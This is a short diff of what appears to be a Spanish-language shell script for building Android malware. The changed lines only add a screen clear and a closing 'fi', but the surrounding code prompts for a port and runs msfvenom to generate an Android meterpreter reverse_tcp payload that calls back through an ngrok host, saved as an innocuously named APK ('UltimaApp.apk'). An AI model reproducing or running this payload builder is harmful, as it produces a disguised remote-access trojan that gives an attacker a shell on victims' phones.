@@ -81,8 +81,10 @@ done
 "
 read -p "$ " hgjkdw
 else
+clear
 read -p "puerto: " puerto
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
+fi
 }
 
 
